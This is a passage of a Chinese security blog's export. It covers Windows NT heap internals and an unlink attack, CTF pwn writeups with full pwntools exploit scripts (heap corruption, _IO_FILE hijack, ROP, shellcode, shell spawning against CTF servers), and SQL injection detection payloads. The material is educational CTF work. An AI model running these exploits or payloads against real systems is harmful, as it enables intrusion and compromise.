    <content type="text"><![CDATA[前言针对Nt Heap的Back-End的攻击方式,同样是利用释放堆块时触发合并之后的unlink. 漏洞使用通过构造fake chunk并使其被unlink导致一次固定地址写. 由于Nt Heap有SmallTagindex的检测,所以一定要构造好头部,另外Flink和Blink指针指向的是User Data部分. 12345//检测语句Q-&gt;Blink-&gt;Flink == Q &amp;&amp; Q-&gt;Flink-&gt;Blink == Q;//unlink关键语句Q-&gt;Blink-&gt;Flink = Q-&gt;Flink;Q-&gt;Flink-&gt;Blink = Q-&gt;Blink; 绕过方式,找到指向该chunk数据区域的指针Q即可,要防止Q指向的chunk是ListHints的表头,否则会导致check失败. 1| chunk header | &amp;Q - 8 | &amp;Q | 导致结果:Q = &amp;Q.]]></content>
      <categories>
        <category>binary</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>NtHeap-pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-漏洞分析-Windows-NtHeap-pwn-基础]]></title>
    <url>%2Fposts%2Ff67e0457%2F</url>
    <content type="text"><![CDATA[前言参考:https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-chinese-version. 适用版本:win10(1809) 64bit OS build - 17763.379. 内存分配机制win10默认内存分配机制为Nt Heap,win10还有一套全新的内存分配机制SegmentHeap,现用于部分系统程序及UWP程序.这里主要讨论Nt Heap. win10的内存分配机制与win7/Linux最大的差别在于分配的结果随机化,难以预测分配的堆块. Nt Heap机制中主要分为两部分:后端管理器Back-End和前端管理器Front-End(非Debug模式才会启用). 前端管理器又称为LowFragmentationHeap(LFH),相同大小(只针对size &lt;= 0x4000)分配到一定次数后启用LFH. LFH未启用时由后端管理器Back-End直接管理内存分配,当某个大小的LFH启用后,第一次或LFH管理的内存用尽时会向后端管理器申请内存进行管理,其他时候LFH直接管理该大小的内存分配. HEAP种类一个进程的HEAP可分为Process Heap和Private Heap. 前者类似Linux的brk堆,是默认Heap,整个进程共享,保存在进程_PEB,供API和C运行时程序库(CRT)使用.后者是另外使用HeapCreate函数创建的堆. 核心数据结构Nt Heap的核心数据结构. _HEAP,最核心的结构,用于管理HEAP,每个HEAP都会有一个_HEAP,通常位于HEAP的开头; _HEAP_ENTRY,内存分配的基本单位,后文会以chunk指代_HEAP_ENTRY对象(前后端分配器对应的结构不太一样); _HEAP_VIRTUAL_ALLOC_ENTRY,大块内存的分配的基本单位; _HEAP_LIST_LOOKUP,用来管理一定大小的chunk; _LFH_HEAP,用于管理前端分配器内存分配; _HEAP12345678+0x07c EncodeFlagMask : Uint4B //4B+0x080 Encoding : _HEAP_ENTRY //10B+0x110 VirtualAllocdBlocks : _LIST_ENTRY //10B+0x138 BlocksIndex : Ptr64 Void //8B+0x150 FreeLists : _LIST_ENTRY //10B+0x198 FrontEndHeap : Ptr64 Void //8B+0x1a8 FrontEndHeapUsageData : Ptr64 Wchar //8B+0x1b2 FrontEndHeapStatusBitmap : [129] UChar //129B 123//_LIST_ENTRY+0x000 Flink : Ptr64 _LIST_ENTRY+0x008 Blink : Ptr64 _LIST_ENTRY EncodeFlagMask:初始化为0x100000,指示是否对chunk header编码,0x100000表示进行编码. Encoding:编码过程即使用该变量与chunk header(除去User Data的部分,也就是前0x10个字节)异或. VirtualAllocdBlocks:连接VirtualAlloc chunk. BlocksIndex:用来管理Back-End中的chunk,类型为_HEAP_LIST_LOOKUP. FreeLists:连接Back-End中的Freed chunk,使用双向链表,按由小到大顺序组织. FrontEndHeap:指向该_HEAP对应的_LFH_HEAP. FrontEndHeapUsageData:指向一个数组,储存各大小的分配次数,用于判断是否要对该大小启用LFH. FrontEndHeapStatusBitmap:指示各大小是否已经启用LFH. _HEAP_ENTRYBack-End中_HEAP_ENTRY有两种状态:Allocated chunk,Freed chunk. 下面是Allocated chunk. 1234567+0x000 PreviousBlockPrivateData : Ptr64 Void //8B+0x008 Size : Uint2B //2B+0x00a Flags : UChar //1B+0x00b SmallTagIndex : UChar //1B+0x00c PreviousSize : Uint2B //2B+0x00e SegmentOffset : UChar //1B+0x00f UnusedBytes : UChar //1B PreviousBlockPrivateData:可做为前一chunk的data,因为64位chunk要0x10对齐,对该chunk无意义. Size:储存chunk_size &gt;&gt; 4,后文会以Size指代chunk_size &gt;&gt; 4. Flags:指示该chunk是否`inused. SmallTagIndex:前三个byte异或后的值,解码chunk header后会验证byte0 ^ byte1 ^ byte2 == byte3来防止chunk header被篡改. PreviousSize:前一chunk的Size. SegmentOffset:某些情况下用来找segment. UnusedBytes:记录malloc后所剩chunk的空间,可以用来判断chunk是Front-End还是Back-End. User Data:用户真正存储数据的区域. 下面是Freed chunk. User Data前0x10字节存储Flink和Blink. Flink:指向linked list中的下一个chunk. Blink:指向linked list中的上一个chunk. Flags:为0. UnusedBytes:恒为0. 其他与Allocated chunk一致. _HEAP_VIRTUAL_ALLOC_ENTRY还有一种VirtualAlloc chunk,类型为_HEAP_VIRTUAL_ALLOC_ENTRY(mmap chunk). 12345+0x000 Entry : _LIST_ENTRY //10B+0x010 ExtraStuff : _HEAP_ENTRY_EXTRA //10B+0x020 CommitSize : Uint8B //8B+0x028 ReserveSize : Uint8B //8B+0x030 BusyBlock : _HEAP_ENTRY //10B Flink(Entry):指向下一个VirtualAlloc chunk. Blink(Entry):指向上一个VirtualAlloc chunk. Size(BusyBlock):unused size,没有移位处理. UnusedBytes(BusyBlock):恒为4. _HEAP_LIST_LOOKUP 123456789+0x000 ExtendedLookup : Ptr64 _HEAP_LIST_LOOKUP //8B+0x008 ArraySize : Uint4B //4B+0x00c ExtraItem : Uint4B //4B+0x010 ItemCount : Uint4B //4B+0x014 OutOfRangeItems : Uint4B //4B+0x018 BaseIndex : Uint4B //4B+0x020 ListHead : Ptr64 _LIST_ENTRY //8B+0x028 ListsInUseUlong : Ptr64 Uint4B //8B+0x030 ListHints : Ptr64 Ptr64 _LIST_ENTRY //8B ExtendedLookup:指向下一个_HEAP_LIST_LOOKUP结构,通常用于管理更大Size的chunk(BlocksIndex通常初始化null). ArraySize:该_HEAP_LIST_LOOKUP管理的最大Size(BlocksIndex通常初始化0x80,也就是size &lt;= 0x800). ItemCount:该_HEAP_LIST_LOOKUP管理的chunk数量. OutOfRangeItems:超出最大Size的chunk数量. BaseIndex:管理的chunk的起始index(最小Size),用于从ListHind找合适大小的Freed chunk. ListHead:FreeLists的Head,指向_HEAP-&gt;FreeLists. ListsInUseUlong:指向用于指示ListHints中是否对应大小的chunk list的bitmap. ListHints:指向一个成员为对应大小的chunk list的数组. _LFH_HEAP 12345678910111213141516171819+0x000 Lock : _RTL_SRWLOCK+0x008 SubSegmentZones : _LIST_ENTRY+0x018 Heap : Ptr64 Void+0x020 NextSegmentInfoArrayAddress : Ptr64 Void+0x028 FirstUncommittedAddress : Ptr64 Void+0x030 ReservedAddressLimit : Ptr64 Void+0x038 SegmentCreate : Uint4B+0x03c SegmentDelete : Uint4B+0x040 MinimumCacheDepth : Uint4B+0x044 CacheShiftThreshold : Uint4B+0x048 SizeInCache : Uint8B+0x050 RunInfo : _HEAP_BUCKET_RUN_INFO+0x060 UserBlockCache : [12] _USER_MEMORY_CACHE_ENTRY+0x2a0 MemoryPolicies : _HEAP_LFH_MEM_POLICIES+0x2a4 Buckets : [129] _HEAP_BUCKET+0x4a8 SegmentInfoArrays : [129] Ptr64 _HEAP_LOCAL_SEGMENT_INFO+0x8b0 AffinitizedInfoArrays : [129] Ptr64 _HEAP_LOCAL_SEGMENT_INFO+0xcb8 SegmentAllocator : Ptr64 _SEGMENT_HEAP+0xcc0 LocalData : [1] _HEAP_LOCAL_DATA Heap:指向对应的_HEAP对象. Buckets:_HEAP_BUCKET数组,用来管理对应大小的_HEAP_BUCKET. SegmentInfoArrays:_HEAP_LOCAL_SEGMENT_INFO数组,用于管理对应的_HEAP_SUBSEGMENT的信息. LocalData:其中有一个指针指向_LFH_HEAP本身. _HEAP_BUCKET12345+0x000 BlockUnits : Uint2B+0x002 SizeIndex : UChar+0x003 UseAffinity : Pos 0, 1 Bit+0x003 DebugFlags : Pos 1, 2 Bits+0x003 Flags : UChar BlockUnits:要分配出去的Block的Size. SizeIndex:使用者需要的Size. _HEAP_LOCAL_SEGMENT_INFO123456789+0x000 LocalData : Ptr64 _HEAP_LOCAL_DATA+0x008 ActiveSubsegment : Ptr64 _HEAP_SUBSEGMENT+0x010 CachedItems : [16] Ptr64 _HEAP_SUBSEGMENT+0x090 SListHeader : _SLIST_HEADER+0x0a0 Counters : _HEAP_BUCKET_COUNTERS+0x0a8 LastOpSequence : Uint4B+0x0ac BucketIndex : Uint2B+0x0ae LastUsed : Uint2B+0x0b0 NoThrashCount : Uint2B LocalData:指向_LFH_HEAP-&gt;LocalData,方便从_HEAP_LOCAL_SEGMENT_INFO对象找回对应的_LFH_HEAP. ActiveSubsegment:优先分配的Subsegment,_HEAP_SUBSEGMENT用于管理UserBlocks,记录UserBlocks剩余了多少chunk,最大分配数等. CachedItems:存放该_HEAP_LOCAL_SEGMENT_INFO中还有可分配chunk的Subsegment,用于补充ActiveSubsegment. BucketIndex:对应的_HEAP_BUCKET的Index. _HEAP_SUBSEGMENT123456789101112+0x000 LocalInfo : Ptr64 _HEAP_LOCAL_SEGMENT_INFO+0x008 UserBlocks : Ptr64 _HEAP_USERDATA_HEADER+0x010 DelayFreeList : _SLIST_HEADER+0x020 AggregateExchg : _INTERLOCK_SEQ+0x024 BlockSize : Uint2B+0x026 Flags : Uint2B+0x028 BlockCount : Uint2B+0x02a SizeIndex : UChar+0x02b AffinityIndex : UChar+0x024 Alignment : [2] Uint4B+0x02c Lock : Uint4B+0x030 SFreeListEntry : _SINGLE_LIST_ENTRY LocalInfo:指向对应的_HEAP_LOCAL_SEGMENT_INFO对象. UserBlocks:LFH的内存分配池,也就是要分配出去的chunk所在位置.开头会有些metadata管理这些chunk. AggregateExchg:_INTERLOCK_SEQ用来管理对应的UserBlocks中还有多少Freed chunk和实现Lock. BlockSize:该_HEAP_SUBSEGMENT中的UserBlocks中每个Block(chunk)的大小. BlockCount:该_HEAP_SUBSEGMENT中的UserBlocks中Block的数量. SizeIndex:该_HEAP_SUBSEGMENT中的UserBlocks中Block对应到的SizeIndex. _INTERLOCK_SEQ12345+0x000 Depth : Uint2B+0x002 Hint : Pos 0, 15 Bits+0x002 Lock : Pos 15, 1 Bit+0x002 Hint16 : Uint2B+0x000 Exchg : Int4B Depth:该UserBlocks所剩下的Freed chunk数量. Lock:用于实现Lock的变量. _HEAP_USERDATA_HEADER1234567891011+0x000 SFreeListEntry : _SINGLE_LIST_ENTRY+0x000 SubSegment : Ptr64 _HEAP_SUBSEGMENT+0x008 Reserved : Ptr64 Void+0x010 SizeIndexAndPadding : Uint4B+0x010 SizeIndex : UChar+0x011 GuardPagePresent : UChar+0x012 PaddingBytes : Uint2B+0x014 Signature : Uint4B+0x018 EncodedOffsets : _HEAP_USERDATA_OFFSETS+0x020 BusyBitmap : _RTL_BITMAP_EX+0x030 BitmapData : [1] Uint8B SubSegment:指向对应的_HEAP_SUBSEGMENT对象. EncodedOffsets:UserBlocks初始化时设置,用于验证chunk header,值为(sizeof(_HEAP_USERDATA_HEADER) | (BlockUnits * 0x10 &lt;&lt; 16)) ^ (LFHkey) ^ (&amp;UserBlocks) ^ (&amp;_LFH_HEAP). BusyBitmap:该UserBlocks中chunk的使用状态的bitmap. 后面的内存空间即为LFH回传给用户的chunk,数据类型为_HEAP_ENTRY(LFH). _HEAP_ENTRY(LFH)12345+0x000 PreviousBlockPrivateData : Ptr64 Void+0x008 SubSegmentCode : Uint4B+0x00c PreviousSize : Uint2B+0x00e SegmentOffset : UChar+0x00f UnusedBytes : UChar SubSegmentCode:encode过的metadata,用于推回UserBlocks的位置. PreviousSize:该chunk在所属UserBlocks的index. UnusedBytes:UnusedBytes &amp; 0x80 = true,同时Freed状态下不为0x80,用于判断是否为LFH的Free chunk. 所有chunk header都在初始化时经过xor过,值为(&amp;_HEAP) ^ (LFHkey) ^ (&amp;_HEAP_ENTRY &gt;&gt; 4) ^ (((&amp;_HEAP_ENTRY) - (&amp;UserBlocks)) &lt;&lt; 12). 分配机制Back-End使用RtlpAllocateHeap分配内存,RtlpFreeHeap释放内存. Front-End使用RtlpLowFragHeapAllocFromContext分配. Back-End中所有被操作的chunk都会先对chunk header进行decode处理后验证对齐,UnusedBytes,SmallTagIndex,并在结束操作前encode. Front-End中的验证机制有所不同,具体看相关数据结构. RtlpAllocateHeap按大小分三种情况:size &lt;= 0x4000,0x4000 &lt; size &lt;= 0xff000,size &gt; 0xff000. size &lt;= 0x4000(DEBUG模式下不会启用LFH). 通过FrontEndHeapStatusBitmap查看LFH是否启用,启用则调用LFH进行分配,否则进入下一步. 未启用则将FrontEndHeapUsageData中对应大小加上0x21(0x20 + 0x1,前者为该大小总数量,后者为正在使用的数量),然后检测其值是否超过0xff00或者&amp; 0x1f后超过0x10,是则启用对应大小的LFH. 接着通过ListsInUseUlong判断ListHints中是否存在对应大小的chunk list. 有则判断该chunk list表头下一个Freed chunk大小是否一样,一样就填入ListHints对应项作为新表头,否则清空对应项,最后使用unlink将原表头从FreeLists移除并返回给用户. 没有则通过ListsInUseUlong寻找更大的Freed chunk,找到后使用同上操作,但不直接返回而是进行切割后再返回给用户,剩余部分插入FreeLists,可以放入ListHints则放入 如果没有找到,尝试ExtendHeap加大Heap,再进行切割处理. 0x4000 &lt; size &lt;= 0xff000. 除了没有LFH相关操作外同上. size &gt; 0xff000. 直接使用ZwAllocateVirtualMemory分配(类似mmap),同时将chunk插入_HEAP-&gt;VirtualAllocdBlocks. RtlpFreeHeap按大小分两种情况:size &lt;= 0xff000,size &gt; 0xff000. size &lt;= 0xff000. 如果是非LFH分配的chunk(通过UnusedBytes判断),FrontEndHeapUsageData对应成员减一. 通过PreviousSize计算出前一chunk地址,如果前一chunk是Freed chunk,检测P-&gt;Flink-&gt;Blink == P-&gt;Blink-&gt;Flink == P,通过则开始合并. 接着查看对应BlocksIndex的ListHints的对应项是否为该chunk,是则更新ListHints,否则不改变ListHints. 然后对前一个Freed chunk进行unlink. 开始合并,合并后更新size,PreviousSize. 对下一chunk进行同样的操作并更新chunk的SmallTagindex. 对于最终合并后的chunk,首先找到对应的BlocksIndex(最大size限制),然后通过ListHead找到FreeLists中的插入点,插入时对FreeLists进行P-&gt;Flink-&gt;Blink == P-&gt;Blink-&gt;Flink == P检查,但这个检查不会abort.然后更新对应的ListHints. size &gt; 0xff000:检查chunk的linked list并将chunk从_HEAP-&gt;VirtualAllocdBlocks移除,接着使用RtlpSecMemFreeVirtualMemory来munmap这个chunk. RtlpLowFragHeapAllocFromContext初始时LFH的enable范围为0 ~ 0x80(BlocksIndex初始化时的范围). 在FrontEndHeapUsageData中某个成员超过0xff00或者&amp; 0x1f后超过0x10,就会设置_HEAP-&gt;CompatibilityFlag |= 0x20000000(第十七次). 第十八次的Allocate会对LFH做出初始化,会先增大FrontEndUsageData及增加BlocksIndex(0x80 ~ 0x400),此时enable LFH范围变为0 ~ 0x400,并设置对应的BusyBitmap.同时建立FrontEndHeap(mmap),初始化其中的SegmentInfoArrays. 第十九次Allocate就会分配并初始化UserBlocks,设置相应的chunk(Block)和ActiveSubsegment,最后随机返回其中的一个chunk. 分配过程. 通过_HEAP_BUCKET-&gt;SizeIndex找到SegmentInfoArrays数组中对应的_HEAP_LOCAL_SEGMENT_INFO,先看_HEAP_LOCAL_SEGMENT_INFO-&gt;ActiveSubsegment中是否有可分配的chunk,通过检测ActiveSubsegment-&gt;AggregateExchg.Depth != 0.没有则从CachedItems找_HEAP_SUBSEGMENT,找到后将ActiveSubsegment替换. 找到有可分配chunk的_HEAP_SUBSEGMENT后检测UserBlocks后随即返回其中的一个chunk. 随机返回的具体过程: 取得RtlpLowFragHeapRandomData[x]的值(下一次取RtlpLowFragHeapRandomData[x + 1]),x大小为1 byte. RtlpLowFragHeapRandomData为一个random 256 byte的阵列,数据范围为0 ~ 0x7f,最后要取的index为RtlpLowFragHeapRandomData[x] * maxIdx &gt;&gt; 7. 如果冲突(通过检测BusyBitmap对应位是否为0,为0表示还可以分配)取最近的,取出后检测(UnusedBytes &amp; 0x3f) != 0(Freed chunk),最后设置BusyBitmap及UnusedBytes就返回了. RtlpFreeHeap更新UnusedBytes,重置对应的UserBlocks-&gt;BusyBitmap,更新ActiveSubsegegment-&gt;AggregateExchg,如果Free的chunk不属于当前ActiveSubsegegment则看能不能放进CachedItems.]]></content>
      <categories>
        <category>binary</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>NtHeap-pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PSY-进化心理学-基础]]></title>
    <url>%2Fposts%2Fddcc4e86%2F</url>
    <content type="text"><![CDATA[问题进化心理学集中探讨四个关键的问题. 心理为什么被设计成现在这个样子?也就是说,哪些过程将人类的心理塑造成当前的形式? 人类心理是如何被设计的?也即是,人类心理的机制或组成部分是什么?它们是如何组织起来的? 心理的组成部分和组织结构拥有什么功能?即心理是被设计来干什么的? 来自当前环境(特别是社会环境)的输入信息,是如何同人类心理的设计特征相互作用,从而产生可观察到的行为的?]]></content>
      <categories>
        <category>PSY</category>
      </categories>
      <tags>
        <tag>进化心理学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-逆向分析-tool-IDA-结构体处理]]></title>
    <url>%2Fposts%2F14dce122%2F</url>
    <content type="text"><![CDATA[结构体的识别汇编层面对于数据的处理只分为字节,字,双字,四字等.所以IDA在没有符号信息时对于数组和结构体是难以正确识别的(通常数组会通过行为判断). 体现在代码中就是结构体成员在汇编代码中的引用通常表现为基址加偏移. 自定义IDA结构体打开结构体窗口,按Insert键增加一个结构体(或者联合),将光标放在新建的结构体的最后一行按d加入数据结构体成员,按a加入ASCII字符串为结构体成员. u仅能删除最后一个结构体成员的定义,对于其他成员只会删除成员名,而不会删除对应的内存空间.IDA不会对字段进行对齐,如果有对其要求需要自行填充字节. Alt + q定义数据为结构体. 导入结构体]]></content>
      <categories>
        <category>binary</category>
        <category>逆向分析</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-basis-CSAPP-存储器层次结构]]></title>
    <url>%2Fposts%2Fb9e77a4d%2F</url>
    <content type="text"></content>
      <categories>
        <category>CS</category>
        <category>basis</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-数字云ctf-quals-pwn]]></title>
    <url>%2Fposts%2Fde112116%2F</url>
    <content type="text"><![CDATA[amazon首先unsorted bin泄露libc,double free即可(具体劫持的hook变量记不清是哪个了). 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *context.log_level = 'debug'#r = process("./amazon")r = remote("121.41.38.38", "9999")def add(index, count, length, content): r.send(str(1)) r.recvuntil("What item do you want to buy: ") r.sendline(str(index)) r.recvuntil("How many: ") r.sendline(str(count)) r.recvuntil("How long is your note: ") r.sendline(str(length)) r.recvuntil("Content: ") r.send(content) r.recvuntil("Your choice: ")def show(): r.sendline(str(2)) data = r.recvuntil("Your choice: ") return datadef delete(index): r.sendline(str(3)) r.recvuntil("Which item are you going to pay for: ") r.sendline(str(index)) r.recvuntil("Your choice: ")r.recvuntil("Your choice: ")for i in range(9): add(0, 10, 0x100, "abc" + str(i))for i in range(8): delete(i)libc = u64(show().split("abc6\nName: ")[1][:6].ljust(8, "\x00")) - 0x3ebca0add(0, 10, 0x100, "abc" + str(i))add(0, 10, 0x100, "abc" + str(i))delete(7)add(0, 10, 0x10, "abc" + str(i))add(0, 10, 0x80, "abc" + str(i))add(0, 10, 0x10, "abc" + str(i))delete(12)delete(12)add(0, 10, 0x100, "a" * 0x20 + p64(libc + 0x3ed8e8 - 0x50) + "a" * 0xa8 + "/bin/sh\x00")#0x3ebc30add(0, 10, 0x80, "cat flag\x00")add(2, 10, 0x80, p64(0) * 6 + p64(libc + 0x4f440))r.sendline(str(3))r.recvuntil("Which item are you going to pay for: ")r.sendline(str(13))#gdb.attach(r)print "libc: " + hex(libc)r.interactive() fkroman思路与上次de1ctf的weapon类似,这次写了个脚本爆破. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778from pwn import *context.log_level = 'debug'def add(index, length): r.sendline(str(1)) r.recvuntil("Index: ") r.sendline(str(index)) r.recvuntil("Size: ") r.sendline(str(length)) r.recvuntil("Your choice: ")def edit(index, length, content): r.sendline(str(4)) r.recvuntil("Index: ") r.sendline(str(index)) r.recvuntil("Size: ") r.sendline(str(length)) r.recvuntil("Content: ") r.send(str(content)) r.recvuntil("Your choice: ")def delete(index): r.sendline(str(3)) r.recvuntil("Index: ") r.sendline(str(index)) r.recvuntil("Your choice: ")#r = process("./fkroman")while 1: r = remote("121.40.246.48", "9999") r.recvuntil("Your choice: ") add(0, 0x60) add(1, 0x60) add(2, 0x60) add(3, 0x60) add(9, 0x10) delete(0) delete(2) delete(0) edit(1, 0x80, "a" * 0x60 + p64(0) + p64(0xe1) + "\n") delete(2) edit(1, 0x80, "a" * 0x60 + p64(0) + p64(0x71) + "\n") edit(2, 2, p16(0xb5dd)) add(0, 0x60) add(2, 0x60) try : add(4, 0x60) r.sendline(str(4)) r.recvuntil("Index: ") r.sendline(str(4)) r.recvuntil("Size: ") r.sendline(str(0x54)) r.recvuntil("Content: ") r.send(str(p8(0) * 3 + p64(0) * 6 + p64(0xfbad3887) + p64(0) * 3 + p8(0x88))) libc = u64(r.recv()[:8]) - 0x3c48e0 delete(0) edit(0, 0x8, p64(libc + 0x3c4b10 - 0x23)) add(0, 0x60) add(5, 0x60) edit(5, 0x1b, "0" * 0x13 + p64(libc + 0xf02a4)) delete(9) r.sendline(str(3)) r.recvuntil("Index: ") r.sendline(str(9)) #gdb.attach(r) print "libc: " + hex(libc) r.interactive() except EOFError as e: continue dark比赛的时候没写出来.主要两个利用点当时没发现.一个是alarm + 0x5是syscall(且后续没有有影响的处理,可正常返回),一个是可以通过ret2csu控制rdx. 这里的exp没写完,因为程序限制了syscall不能使用write,所以需要读取flag到栈上并通过shellcode爆破. 123456789101112131415161718192021222324252627282930313233343536373839404142434445from pwn import *offset = 0x18pop_rdi_ret = 0x40127bpop_rsi_p_ret = 0x401279pop_rsp_ppp_ret = 0x401275csu_start_addr = 0x401258csu_end_addr = 0x401272context.arch = "amd64"r = process("./dark")elf = ELF("./dark")payload = "a" * offsetpayload += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_p_ret) + p64(0x404050) + p64(0) + p64(elf.plt["read"])payload += p64(pop_rsp_ppp_ret) + p64(0x404050)r.send(payload)payload = "a" * offsetpayload += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_p_ret) + p64(elf.got["alarm"]) + p64(0) + p64(elf.plt["read"])payload += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_p_ret) + p64(0x404050) + p64(0) + p64(elf.plt["read"])payload += p64(csu_end_addr) + p64(0) + p64(1) + p64(elf.got["alarm"]) + p64(0x404000) + p64(0x1000) + p64(7)payload += p64(csu_start_addr) + p64(0) * 7payload += p64(csu_end_addr) + p64(0) + p64(1) + p64(elf.got["read"]) + p64(0) + p64(0x404450) + p64(0x1000)payload += p64(csu_start_addr) + p64(0) * 7payload += p64(0x404450)r.send(payload)sleep(1)r.send(p8(0x45))#&lt;alarm+5&gt;: syscallsleep(1)r.send("a" * 10)#rax = 10#gdb.attach(r, "b * 0x404450")sleep(1)payload = asm(shellcraft.amd64.linux.open('./flag\x00'))payload += asm(shellcraft.amd64.linux.read(3, 0x404550, 0x30))r.send(payload)#shellcoder.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-kctf-2019-q3]]></title>
    <url>%2Fposts%2Ffc78af35%2F</url>
    <content type="text"><![CDATA[heap未检查index.unsorted bin泄露libc,加上程序给的heap. 劫持_IO_FILE结构体,构造fake_vtable调用system(&quot;/bin/sh&quot;). 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *context.log_level = 'debug'def add(size): r.sendline("1") r.sendlineafter("Input size : ", str(size)) data = r.recvuntil("&gt;&gt;") return datadef delete(index): r.sendline("2") r.sendlineafter("Input idx : ", str(index)) r.recvuntil("&gt;&gt;")def edit(index, content): r.sendline("3") r.sendlineafter("Input idx : ", str(index)) r.sendlineafter("Input text : ", content) data = r.recvuntil("&gt;&gt;") return datar = remote("154.8.174.214", "10001")#r = process("./pwn")r.recvuntil("&gt;&gt;")heap = int(add(0x3f8)[11:23], 16) - 0x10libc = u64(edit(-6, p64(0xfbad3887) + p64(0) * 3 + p8(0x88))[:8]) - 0x3c48e0edit(0, p64(libc + 0x45390) * 21)r.sendline("3")r.sendlineafter("Input idx : ", str(-6))payload = "/bin/sh\x00" + p64(libc + 0x3c56a3) * 7 + p64(libc + 0x3c56a4) + p64(0) * 4 + p64(libc + 0x3c48e0) + p64(1) + p64(0xffffffffffffffff)payload += p64(0) + p64(libc + 0x3c6780) + p64(0xffffffffffffffff) + p64(0) + p64(libc + 0x3c47a0) + p64(0) * 3 + p64(0xffffffff) + p64(0) * 2payload += p64(heap + 0x10)#fake_vtabler.sendlineafter("Input text : ", payload)#gdb.attach(r)print "heap: " + hex(heap)print "libc: " + hex(libc)r.interactive() 0xbird这题作者自己实现了malloc和free.free后的内存以链表的方式存储. 存在uaf,修改fd,不过这里存在size check,绕过即可. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from pwn import *context.log_level = 'debug'def alloc(size): r.sendline("A") r.sendlineafter("Size: ", str(size)) r.recvuntil("2019KCTF| ")def free(index): r.sendline("F") data = r.sendlineafter("Index: ", str(index)) r.recvuntil("2019KCTF| ") return datadef nice(): r.sendline("N") r.recvuntil("Here you go: ") data = r.recvuntil("\n")[:-1] r.recvuntil("2019KCTF| ") return datadef write(index, content): r.sendline("W") r.sendlineafter("Write addr: ", str(index)) r.sendafter("Write value: ", content) r.recvuntil("2019KCTF| ")r = process("./0xbird1")#r = remote("154.8.174.214", "10000")r.recvuntil("2019KCTF| ")stack = int(nice(), 16)alloc(0x78)#1alloc(0x78)#2alloc(0x78)#3alloc(0x78)#4mmap = int(free(2).split(' ')[1], 16) - 0x8free(3)write(3, p64(0) * 13 + p64(0x602095))#fake_fdalloc(0x78)#5alloc(0x78)#6#malloc fake_chunkwrite(6, "\x00" * 3 + p64(0x602018))write(2, asm(shellcraft.amd64.linux.sh(), arch = 'amd64'))r.sendline("W")r.sendlineafter("Write addr: ", str(1))r.sendafter("Write value: ", p64(mmap + 0x88))print "stack: " + hex(stack)print "mmap: " + hex(mmap)print "offset: " + hex(stack - mmap)r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web安全-SQL注入-基础]]></title>
    <url>%2Fposts%2F19e6b508%2F</url>
    <content type="text"><![CDATA[概览攻击者通过提交参数并绕过过滤,导致执行了额外的SQL(结构化查询语言)语句从而获取敏感信息或者执行其他恶意操作. 注入检测通过在应用程序中触发错误和布尔逻辑来检测存在SQL注入的输入点. 布尔注入检测SQL注入可以按照注入点的参数类型分为数字型注入和字符型注入. 数字型注入没有单引号. 12$id = $_GET['id'];$sql = "SELECT * FROM users WHERE id=$id LIMIT 0,1"; 字符型注入中参数前后有单引号闭合. 12$id = $_GET['id'];$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1"; 1 and 1=1正常返回,1 and 1=2不正常返回则是数字型注入. 1&#39; and &#39;1&#39;=&#39;1正常返回,1&#39; and &#39;1&#39;=&#39;2不正常返回则是字符型注入. 这种方法也叫做布尔盲注. 数据库类型检测确定目标数据库类型通常通过错误消息和使用内置函数来判断. 对于字符型注入可以使用单个单引号触发报错. 1page.php?id=&apos; 对于MySQL可以使用以下语句检测. 123page.php?id=1&apos;-SLEEP(1)=0 LIMIT 1 --page.php?id=1&apos;-BENCHMARK(5000000, ENCODE(&apos;Slow Down&apos;,&apos;by 5 seconds&apos;))=0 LIMIT 1 --page.php?id=&apos; &apos;mysql&apos; -- MySQL注入MySQL是一种开放源代码的关系型数据库管理系统. MySQL中有一个information_schema库,其中保存着关于MySQL服务器所维护的所有其他数据库的信息,如数据库名,数据库的表,表栏的数据类型与访问权限等.information_schema中有数个只读表,它们实际上是视图,因此并不存在对应数据库文件. information_schema.SCHEMATA:提供了当前mysql实例中所有数据库的信息(show databases的结果). information_schema.tables:提供了关于数据库中的表的信息,记录某个表属于哪个schema,表类型,表引擎,创建时间等信息(show tables from schemaname的结果). information_schema.columns:提供了表中的列信息,记录某张表的所有列以及每个列的信息(show columns from schemaname.tablename的结果). MySQL中还有一个核心数据库mysql,类似于sql server中的master表,负责存储数据库的用户,权限设置,关键字等控制和管理信息. 常用函数user():当前用户.version():当前mysql版本.database():当前数据库.CONCAT(str1, str2, ...):连接字符串.任何一个参数为NULL则返回值为NULL.CONCAT_WS(separator, str1, str2, ...):CONCAT()的特殊形式.第一个参数是分隔符.分隔符可以是一个字符串,也可以是其它参数.如果分隔符为NULL,则结果为NULL(忽略任何分隔符参数后的NULL值.但不会忽略任何空字符串).GROUP_CONCAT([distinct] field [order by field asc/desc] [separator char]):例如:group_concat(score order by score separator &#39;:&#39;). 联合查询注入UNION用于合并两个或多个SELECT语句的结果集,并消去表中任何重复行.合并的选择查询必须具有相同的输出字段数,采用相同的顺序并包含相同或兼容的数据类型. ORDER BY按一个或多个字段排序查询结果,可以是升序(ASC)和降序(DESC),缺省是升序.ORDER BY子句通常放在SQL语句的最后.ORDER 